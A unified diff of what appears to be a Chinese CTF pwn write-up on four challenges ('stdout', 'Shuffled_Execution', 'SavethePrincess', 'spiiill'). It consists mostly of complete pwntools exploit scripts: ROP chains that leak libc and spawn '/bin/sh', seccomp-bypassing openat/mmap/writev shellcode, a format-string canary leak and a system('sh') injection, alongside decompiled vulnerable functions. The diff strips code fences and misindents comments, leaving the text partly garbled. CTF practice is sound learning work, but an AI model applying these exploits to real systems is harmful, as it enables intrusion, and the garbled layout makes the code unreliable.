@@ -36,17 +36,17 @@ int init()
  return setvbuf(stdin, 0LL, 2, 0LL);
 }
 
-from pwn import * 
+from pwn import *
 context(log_level = 'debug',arch = 'amd64')
 p = process('./pwn')
 libc = ELF('./libc-2.31.so')
 
 ru = lambda a: p.readuntil(a)
 r = lambda n: p.read(n)
-sla = lambda a,b: p.sendlineafter(a,b) 
-sa = lambda a,b: p.sendafter(a,b) 
-sl = lambda a: p.sendline(a) 
-s = lambda a: p.send(a) 
+sla = lambda a,b: p.sendlineafter(a,b)
+sa = lambda a,b: p.sendafter(a,b)
+sl = lambda a: p.sendline(a)
+s = lambda a: p.send(a)
 
 vuln = 0x40125D
 extend = 0x401287
@@ -127,23 +127,23 @@ struct iovec {
  size_t iov_len; // 缓冲区的长度
 };
 
-push 0x100 
-lea rbx, [rsp+8] 
-push rbx 
+push 0x100
+lea rbx, [rsp+8]
+push rbx
 mov rsi, rsp
 
-from pwn import * 
+from pwn import *
 context(log_level = 'debug',arch = 'amd64')
 p = process('./pwn')
 
 ru = lambda a: p.readuntil(a)
 r = lambda n: p.read(n)
-sla = lambda a,b: p.sendlineafter(a,b) 
-sa = lambda a,b: p.sendafter(a,b) 
-sl = lambda a: p.sendline(a) 
-s = lambda a: p.send(a) 
+sla = lambda a,b: p.sendlineafter(a,b)
+sa = lambda a,b: p.sendafter(a,b)
+sl = lambda a: p.sendline(a)
+s = lambda a: p.send(a)
 
-mov_esi_0=b'xbex00x00x00x00' 
+mov_esi_0=b'xbex00x00x00x00'
 p.recv()
 
 shell = '''
@@ -158,7 +158,7 @@ mov rsp,0x1338000
  push SYS_openat
  pop rax
  syscall
- 
+
  mov rdi, 0x10000
  mov rsi, 0x1000
  mov rdx, 7
@@ -170,7 +170,7 @@ mov rsp,0x1338000
  push SYS_mmap
  pop rax
  syscall
- 
+
  push 1
  pop rdi
  push 0x1 /* iov size */
@@ -211,7 +211,7 @@ while True:
 
  if (data == num + 1):
  num += 1
- 
+
  elif (data == 112):
  key_list = ''.join(key)
  log.success(key_list)
@@ -237,17 +237,17 @@ line CODE JT JF K
  0012: 0x06 0x00 0x00 0x7fff0000 return ALLOW
  0013: 0x06 0x00 0x00 0x00000000 return KILL
 
-from pwn import * 
+from pwn import *
 context(log_level = 'debug',arch = 'amd64')
 p = process('./pwn')
 libc = ELF('./libc.so.6')
 
 ru = lambda a: p.readuntil(a)
 r = lambda n: p.read(n)
-sla = lambda a,b: p.sendlineafter(a,b) 
-sa = lambda a,b: p.sendafter(a,b) 
-sl = lambda a: p.sendline(a) 
-s = lambda a: p.send(a) 
+sla = lambda a,b: p.sendlineafter(a,b)
+sa = lambda a,b: p.sendafter(a,b)
+sl = lambda a: p.sendline(a)
+s = lambda a: p.send(a)
 
 key = ['a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a']
 data = ''
@@ -262,7 +262,7 @@ while True:
 
  if (data == num + 1):
  num += 1
- 
+
  elif (data == 112):
  key_list = ''.join(key)
  log.success(key_list)
@@ -293,8 +293,8 @@ log.info('stack_base => ' + hex(stack_base))
 pop_rdi_ret = 0x000000000002a3e5 + libcbase
 pop_rsi_ret = 0x000000000002be51 + libcbase
 pop_rdx_r12_ret = 0x000000000011f2e7 + libcbase
-mprotect = libc.symbols['mprotect'] + libcbase 
-#read = libc.symbols['read'] + libcbase 
+mprotect = libc.symbols['mprotect'] + libcbase
+#read = libc.symbols['read'] + libcbase
 leave_ret = 0x000000000004da83 + libcbase
 
 shellcode ='''
@@ -308,7 +308,7 @@ shellcode ='''
  push SYS_openat
  pop rax
  syscall
- 
+
  mov rdi, 0x10000
  mov rsi, 0x1000
  mov rdx, 7
@@ -395,7 +395,7 @@ int __fastcall sub_1CFB(__int64 a1)
 
  while ( 1 )
  {
- v1 = *(_QWORD *)(a1 + 0x2808); 
+ v1 = *(_QWORD *)(a1 + 0x2808);
  *(_QWORD *)(a1 + 0x2808) = v1 + 1;
  v3 = *(_QWORD *)(a1 + 8 * (v1 + 256) + 8);
  if ( v3 > 11 )
@@ -409,7 +409,7 @@ int __fastcall vuln(__int64 a1)
 {
  __int64 v1; // rax
 
- v1 = *(_QWORD *)(a1 + 0x2808); 
+ v1 = *(_QWORD *)(a1 + 0x2808);
  *(_QWORD *)(a1 + 0x2808) = v1 + 1;
  return system((const char *)(8 * (*(_QWORD *)(a1 + 8 * (v1 + 256) + 8) + 0x502LL) + a1));
 }
@@ -426,16 +426,16 @@ __int64 __fastcall sub_1B20(__int64 a1)
  return overflow(a1, v3);
 }
 
-from pwn import * 
+from pwn import *
 context(log_level = 'debug',arch = 'amd64')
 p = process('./pwn')
 
 ru = lambda a: p.readuntil(a)
 r = lambda n: p.read(n)
-sla = lambda a,b: p.sendlineafter(a,b) 
-sa = lambda a,b: p.sendafter(a,b) 
-sl = lambda a: p.sendline(a) 
-s = lambda a: p.send(a) 
+sla = lambda a,b: p.sendlineafter(a,b)
+sa = lambda a,b: p.sendafter(a,b)
+sl = lambda a: p.sendline(a)
+s = lambda a: p.send(a)
 
 def choice():
  sla(b'Give me your choice: n', b'3')
@@ -482,11 +482,6 @@ https://bbs.kanxue.com/user-home-996144.htm
 ```
 一
 stdout
-```
-
-
-
-```
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF
@@ -496,53 +491,33 @@ int __fastcall main(int argc, const char **argv, const char **envp)
  read(0, buf, 0x60uLL);
  return 0;
 }
-```
-
-
-
-```
 ssize_t vuln()
 {
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF
 
  return read(0, buf, 0x200uLL);
 }
-```
-
-
-
-```
 int init()
 {
  setvbuf(stdout, 0LL, 0, 0LL);
  return setvbuf(stdin, 0LL, 2, 0LL);
 }
-```
-
-
-
-```
 int init()
 {
  ;
  return setvbuf(stdin, 0LL, 2, 0LL);
 }
-```
-
-
-
-```
-from pwn import * 
+from pwn import *
 context(log_level = 'debug',arch = 'amd64')
 p = process('./pwn')
 libc = ELF('./libc-2.31.so')
 
 ru = lambda a: p.readuntil(a)
 r = lambda n: p.read(n)
-sla = lambda a,b: p.sendlineafter(a,b) 
-sa = lambda a,b: p.sendafter(a,b) 
-sl = lambda a: p.sendline(a) 
-s = lambda a: p.send(a) 
+sla = lambda a,b: p.sendlineafter(a,b)
+sa = lambda a,b: p.sendafter(a,b)
+sl = lambda a: p.sendline(a)
+s = lambda a: p.send(a)
 
 vuln = 0x40125D
 extend = 0x401287
@@ -553,22 +528,22 @@ pop_rdi_ret = 0x00000000004013d3
 payload = b'a'*0x58 + p64(vuln)
 s(payload)
 
-#gdb.attach(p,'b *0x40127F')
-#pause()
+    #gdb.attach(p,'b *0x40127F')
+    #pause()
 
 p2 = b'a'*0x28 + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) +p64(extend) + p64(vuln)
 s(p2)
 
-#gdb.attach(p,'b *0x40127F')
-#pause()
+    #gdb.attach(p,'b *0x40127F')
+    #pause()
 
 #重复调用extend函数填满缓冲区
 for i in range(20):
  p3 = b'b'*0x28 + p64(extend) + p64(vuln)
  s(p3)
 
-#p3 = b'a'*0x28 + p64(extend) + p64(vuln)
-#s(p3)
+    #p3 = b'a'*0x28 + p64(extend) + p64(vuln)
+    #s(p3)
 p.recvuntil(b'n')
 libcbase = u64(p.recv(6).ljust(8,b'x00')) - 0x10dfc0
 log.success('libcbase ==> ' + hex(libcbase))
@@ -577,8 +552,8 @@ p.recv()
 sys=libc.symbols['execve']+libcbase
 sh=next(libc.search(b'/bin/sh'))+libcbase
 
-#gdb.attach(p,'b *0x40127F')
-#pause()
+    #gdb.attach(p,'b *0x40127F')
+    #pause()
 
 ret = 0x000000000040101a
 pop_rsi_r15 = 0x00000000004013d1
@@ -586,18 +561,8 @@ pop_rdx_ret = 0x0000000000142c92 + libcbase
 p4 = b'c'*0x28 + p64(pop_rdi_ret) + p64(sh) +p64(pop_rsi_r15)+ p64(0)+ p64(0) +p64(pop_rdx_ret)+ p64(0)+p64(sys)
 s(p4)
 p.interactive()
-```
-
-
-
-```
 二
 Shuffled_Execution
-```
-
-
-
-```
 line CODE JT JF K
 =================================
  0000: 0x20 0x00 0x00 0x00000004 A = arch
@@ -616,61 +581,31 @@ line CODE JT JF K
  0013: 0x15 0x01 0x00 0x00000142 if (A == execveat) goto 0015
  0014: 0x06 0x00 0x00 0x7fff0000 return ALLOW
  0015: 0x06 0x00 0x00 0x00000000 return KILL
-```
-
-
-
-```
 ssize_t openat(int dfd, const char* filename, int flags, umode_t mode);
-```
-
-
-
-```
 long sys_mmap(unsigned long addr, unsigned long len,
  unsigned long prot, unsigned long flags,
  unsigned long fd, off_t pgoff);
-```
-
-
-
-```
 ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
-```
-
-
-
-```
 struct iovec {
  void *iov_base; // 指向数据缓冲区的指针
  size_t iov_len; // 缓冲区的长度
 };
-```
-
-
-
-```
-push 0x100 
-lea rbx, [rsp+8] 
-push rbx 
+push 0x100
+lea rbx, [rsp+8]
+push rbx
 mov rsi, rsp
-```
-
-
-
-```
-from pwn import * 
+from pwn import *
 context(log_level = 'debug',arch = 'amd64')
 p = process('./pwn')
 
 ru = lambda a: p.readuntil(a)
 r = lambda n: p.read(n)
-sla = lambda a,b: p.sendlineafter(a,b) 
-sa = lambda a,b: p.sendafter(a,b) 
-sl = lambda a: p.sendline(a) 
-s = lambda a: p.send(a) 
+sla = lambda a,b: p.sendlineafter(a,b)
+sa = lambda a,b: p.sendafter(a,b)
+sl = lambda a: p.sendline(a)
+s = lambda a: p.send(a)
 
-mov_esi_0=b'xbex00x00x00x00' 
+mov_esi_0=b'xbex00x00x00x00'
 p.recv()
 
 shell = '''
@@ -685,7 +620,7 @@ mov rsp,0x1338000
  push SYS_openat
  pop rax
  syscall
- 
+
  mov rdi, 0x10000
  mov rsi, 0x1000
  mov rdx, 7
@@ -697,7 +632,7 @@ mov rsp,0x1338000
  push SYS_mmap
  pop rax
  syscall
- 
+
  push 1
  pop rdi
  push 0x1 /* iov size */
@@ -708,8 +643,8 @@ mov rsp,0x1338000
  syscall
 '''
 
-#gdb.attach(p)
-#pause()
+    #gdb.attach(p)
+    #pause()
 payload= mov_esi_0+asm(shell)
 payload = payload.ljust(0x70,b'x90')
 #栈上写参数
@@ -717,25 +652,10 @@ payload+= p64(0x10000) + p64(0x100)
 s(payload)
 
 p.interactive()
-```
-
-
-
-```
 三
 SavethePrincess
-```
-
-
-
-```
 for ( i = 0; i <= 7; ++i )
  love[i] = rand() % 26 + 97;
-```
-
-
-
-```
 key = ['a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a']
 data = ''
 num = 0
@@ -749,7 +669,7 @@ while True:
 
  if (data == num + 1):
  num += 1
- 
+
  elif (data == 112):
  key_list = ''.join(key)
  log.success(key_list)
@@ -757,11 +677,6 @@ while True:
 
  else:
  key[num] = chr(ord(key[num])+1)
-```
-
-
-
-```
 line CODE JT JF K
 =================================
  0000: 0x20 0x00 0x00 0x00000004 A = arch
@@ -778,22 +693,17 @@ line CODE JT JF K
  0011: 0x15 0x01 0x00 0x00000142 if (A == execveat) goto 0013
  0012: 0x06 0x00 0x00 0x7fff0000 return ALLOW
  0013: 0x06 0x00 0x00 0x00000000 return KILL
-```
-
-
-
-```
-from pwn import * 
+from pwn import *
 context(log_level = 'debug',arch = 'amd64')
 p = process('./pwn')
 libc = ELF('./libc.so.6')
 
 ru = lambda a: p.readuntil(a)
 r = lambda n: p.read(n)
-sla = lambda a,b: p.sendlineafter(a,b) 
-sa = lambda a,b: p.sendafter(a,b) 
-sl = lambda a: p.sendline(a) 
-s = lambda a: p.send(a) 
+sla = lambda a,b: p.sendlineafter(a,b)
+sa = lambda a,b: p.sendafter(a,b)
+sl = lambda a: p.sendline(a)
+s = lambda a: p.send(a)
 
 key = ['a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a']
 data = ''
@@ -808,7 +718,7 @@ while True:
 
  if (data == num + 1):
  num += 1
- 
+
  elif (data == 112):
  key_list = ''.join(key)
  log.success(key_list)
@@ -817,8 +727,8 @@ while True:
  else:
  key[num] = chr(ord(key[num])+1)
 
-#gdb.attach(p, 'b *$rebase(0x166A)')
-#pause()
+    #gdb.attach(p, 'b *$rebase(0x166A)')
+    #pause()
 
 sa(b'ower!!!n', b'%10$p'+b'%15$p'+b'%9$p')
 stack = int(p.recv(14), 16)
@@ -831,16 +741,16 @@ log.info('libcbase => ' + hex(libcbase))
 log.info('canary => ' + hex(canary))
 log.info('stack_base => ' + hex(stack_base))
 
-#gdb.attach(p, 'b *$rebase(0x170B)')
-#pause()
+    #gdb.attach(p, 'b *$rebase(0x170B)')
+    #pause()
 
-#bss = pie + 0x4320
-#start = 0x4000 + pie
+    #bss = pie + 0x4320
+    #start = 0x4000 + pie
 pop_rdi_ret = 0x000000000002a3e5 + libcbase
 pop_rsi_ret = 0x000000000002be51 + libcbase
 pop_rdx_r12_ret = 0x000000000011f2e7 + libcbase
-mprotect = libc.symbols['mprotect'] + libcbase 
-#read = libc.symbols['read'] + libcbase 
+mprotect = libc.symbols['mprotect'] + libcbase
+    #read = libc.symbols['read'] + libcbase
 leave_ret = 0x000000000004da83 + libcbase
 
 shellcode ='''
@@ -854,7 +764,7 @@ shellcode ='''
  push SYS_openat
  pop rax
  syscall
- 
+
  mov rdi, 0x10000
  mov rsi, 0x1000
  mov rdx, 7
@@ -883,18 +793,8 @@ sla(b'> n', b'2')
 sa(b'dragon!!n', payload)
 
 p.interactive()
-```
-
-
-
-```
 四
 spiiill
-```
-
-
-
-```
 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
 {
  int v3; // [rsp+0h] [rbp-4834h] BYREF
@@ -934,21 +834,11 @@ void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
  }
  }
 }
-```
-
-
-
-```
 ssize_t __fastcall sub_1DE2(__int64 a1)
 {
  puts("see you");
  return read(0, (void *)(a1 + 0x808), 0x400uLL);
 }
-```
-
-
-
-```
 int __fastcall sub_1CFB(__int64 a1)
 {
  __int64 v1; // rax
@@ -956,7 +846,7 @@ int __fastcall sub_1CFB(__int64 a1)
 
  while ( 1 )
  {
- v1 = *(_QWORD *)(a1 + 0x2808); 
+ v1 = *(_QWORD *)(a1 + 0x2808);
  *(_QWORD *)(a1 + 0x2808) = v1 + 1;
  v3 = *(_QWORD *)(a1 + 8 * (v1 + 256) + 8);
  if ( v3 > 11 )
@@ -965,24 +855,14 @@ int __fastcall sub_1CFB(__int64 a1)
  }
  return printf("Unknown instruction %zun", v3);
 }
-```
-
-
-
-```
 int __fastcall vuln(__int64 a1)
 {
  __int64 v1; // rax
 
- v1 = *(_QWORD *)(a1 + 0x2808); 
+ v1 = *(_QWORD *)(a1 + 0x2808);
  *(_QWORD *)(a1 + 0x2808) = v1 + 1;
  return system((const char *)(8 * (*(_QWORD *)(a1 + 8 * (v1 + 256) + 8) + 0x502LL) + a1));
 }
-```
-
-
-
-```
 __int64 __fastcall sub_1B20(__int64 a1)
 {
  __int64 v1; // rax
@@ -994,21 +874,16 @@ __int64 __fastcall sub_1B20(__int64 a1)
  ((void (__fastcall *)(__int64))choice[*(_QWORD *)(a1 + 8 * (v1 + 256) + 8)])(a1);
  return overflow(a1, v3);
 }
-```
-
-
-
-```
-from pwn import * 
+from pwn import *
 context(log_level = 'debug',arch = 'amd64')
 p = process('./pwn')
 
 ru = lambda a: p.readuntil(a)
 r = lambda n: p.read(n)
-sla = lambda a,b: p.sendlineafter(a,b) 
-sa = lambda a,b: p.sendafter(a,b) 
-sl = lambda a: p.sendline(a) 
-s = lambda a: p.send(a) 
+sla = lambda a,b: p.sendlineafter(a,b)
+sa = lambda a,b: p.sendafter(a,b)
+sl = lambda a: p.sendline(a)
+s = lambda a: p.send(a)
 
 def choice():
  sla(b'Give me your choice: n', b'3')
@@ -1017,8 +892,8 @@ def Read(num):
  sla(b'Give me your choice: n', b'2')
  sa(b'see youn',num)
 
-#gdb.attach(p, 'b *$rebase(0x1C78)')
-#pause()
+    #gdb.attach(p, 'b *$rebase(0x1C78)')
+    #pause()
 
 Read(p64(0xa)+p64(0xc)+p64(0xfffffffffffffc02)+b'shx00')
 choice()
